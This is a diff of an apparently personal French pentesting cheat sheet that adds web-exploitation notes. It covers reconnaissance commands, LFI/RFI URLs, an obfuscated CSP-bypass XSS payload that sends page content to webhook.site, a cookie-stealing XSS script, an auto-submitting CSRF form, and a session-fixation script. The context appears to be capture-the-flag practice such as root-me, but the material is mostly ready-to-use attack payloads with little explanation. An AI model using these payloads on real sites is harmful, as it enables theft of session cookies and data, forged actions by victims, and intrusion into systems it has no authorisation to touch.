@@ -32,14 +32,20 @@ nmap -p 31000-32000 -sV --open -v localhost | grep -E '^[0-9]+/tcp.*ssl/.*$'
 	| `nc -nv 10.129.42.190 22` | Get the banner |
 	| `netcat 10.10.10.10 22` | Grab banner of an open port |
 	| `openssl s_client -connect localhost:30001` | Connect to remote host by ssl protocole
-	| `crackmapexec smb 10.129.228.239 -u user -p 'PASS' --shares` | enumerate smb shares |
 
-# **Passive Reconnaissance** |
+# Passive Reconnaissance 
 	| `whois <address>` | général info |
+	
+	
+
 # Web Enumeration
 #gobuster_cmd
 ```
-gobuster dir  -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://@IP/
+gobuster dir  -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://$ip/
+```
+## par rapport au cms
+```
+$ find /usr/share/seclists/Discovery/Web-Content/ -type f -name *<cms_name>* 2>/dev/null
 ```
 ## php web server
 ```
@@ -77,7 +83,7 @@ gobuster dns -d inlanefreight.com -w /usr/share/seclists/Discovery/DNS/namelist.
 
 # Subdomaine enumeration 
 ```
-gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain -u http://adresse/
+gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 --append-domain -u http://$ip/
 ```
 ## _online enumeration_
 ```
@@ -103,8 +109,12 @@ Rechercher un exploit sur l'application et les services hébergé
 	| `exploit` | MSF: Run the exploit on the target server is vulnerable |
 |
 # Web Exploits
+## curl
+```
+curl -H "Content-type: application/json" --Cookie "<name>=<value>" -d '{"data":"data"}' -X POST http://domaine
+```
+## LFI 
 #Exploit_LFI/RFI
-## LFI
 LFI (Local File Inclusion) est une vulnérabilité de sécurité informatique qui permet à un attaquant d'inclure des fichiers locaux sur un serveur distant.
 ```
 http://adresse/?page=../etc/passwd
@@ -119,8 +129,85 @@ RFI (Remote File Inclusion) est une vulnérabilité de sécurité informatique s
 http://remote@IP/?page=//@ip_hacker/somefile
 ```
 
+# CSP
+#ExploitCSP[[CSP]]
+## Site de test CSP en ligne
+https://csp-evaluator.withgoogle.com/
+Google fournit une page Web de diagnostic (?) CSP appelée CSP Evaluator, et si vous la testez, elle vous informera des éléments CSP manquants. Il est normal de l'utiliser comme valeur de référence.
+## Bypass script-src unsafe-inline
+```
+<Svg OnLoad=alert(domain)>
+```
+```
+<img src="" onerror="alert(1)">
+```
+On peut modifier le domaine de base du site web par celui d'un serveur d'écoute pour recevoir les requêtes en écrivant du code js dans l'attribut *onerror*
+```
+// flag location in document
+var flag=document.querySelector("body > div > div > p").innerText;
+// bypass http and ':' filtering
+document.write("<base href=\"http+String.fromCharCode(58)+"//webhook.site"+"\" />");
+// redirect to webhook.site
+document.location="229885cb-f49d-41fc-b954-2e2c56a2248c?test="+flag;
+```
+ce qui donne le payload
+```
+<img src='#' onerror='var flag=document.querySelector("body").innerText;document.write("<base href=\"ht"+"tp"+String.fromCharCode(58)+"//webhook.site"+"\" />");document.location="dc09032a-d28b-47f5-9297-8ea08e0c945e?test="+flag;'>
+```
+# CSRF
+#ExploitCSRF
+```
+<img src= x onerror='document.location="?action=profile";document.getElementByName('username').value = "dine";document.forms[0].submit();'>
+```
+
+```
+<form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data">
+	<input type="hidden" name="username" value="username">
+	<input type="hidden" name="status" value="on">
+</form>
+<script>document.forms[0].submit()</script>
+```
+
+# XSS
+#ExploitXSS
+## Insertion de script
+```
+<script>alert("Coucou !');</script>
+```
+### Vole de cookie
+```
+<script>
+document.write('<img src="[URL]?c='+document.cookie+'" />');
+</script>
+```
+### Redirection automatique
+```
+<script>document.location="http://www.hsc.fr/"</script>
+```
+Rend inutilisable la page générée ✗ L'utilisateur ne comprend pas la manipulation
+### Fixation de session
+✗ Principe : utiliser un XSS afin d'imposer un cookie connu à la victime 
+✗ Schéma : 
+✗ L'attaquant se connecte sur le serveur en mode anonyme 
+ Il reçoit un cookie de session (ex JSP ou PHP) 
+✗ Il utilise un XSS sur un serveur du même domaine pour fixer le cookie chez la victime (via le code JavaScript de type 
+```
+<script> document.cookie="PHPSESSIONID=78191;domain=.site.fr" <script>
+```
+✗ Il attend que la victime s'authentifie sur le serveur. Si celui ci est mal programmé (exemple sessions J2EE), le cookie sera accepté. 
+✗ L'attaquant possède alors un cookie de session authentifié valide qu'il peut utiliser en parallèle avec la victime
+
+## Insertion de tags HTML
+### En particulier de tags
+```
+<img src="http://www.serveur.tld/image.jpg"/>
+```
+```
+<img src= x onerror(alerte(1))>
+```
+
 # foothold exploit
-## Partage des ports sur ma machine
+## Partage des ports de la cible sur ma machine
 On utilise *Chisel* https://github.com/jpillora/chisel/releases/tag/v1.9.1
 ### creation du serveur proxi sur ma machine
 └─# 
